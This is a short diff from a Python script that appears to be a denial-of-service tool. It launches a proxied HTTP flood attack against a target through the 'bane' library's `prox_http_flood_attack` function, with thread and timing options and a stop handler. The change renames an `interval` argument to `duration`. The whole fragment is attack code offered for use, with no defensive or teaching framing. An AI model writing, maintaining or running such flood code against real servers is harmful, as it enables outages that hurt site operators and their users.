@@ -41,6 +41,6 @@ while(n<5):
  except:
   pass
 try:
- bane.prox_http_flood_attack(u,p=p,timeout=ti,threads=th,interval=d)
+ bane.prox_http_flood_attack(u,p=p,timeout=ti,threads=th,duration=d)
 except KeyboardInterrupt:
  bane.ddos.stop=True
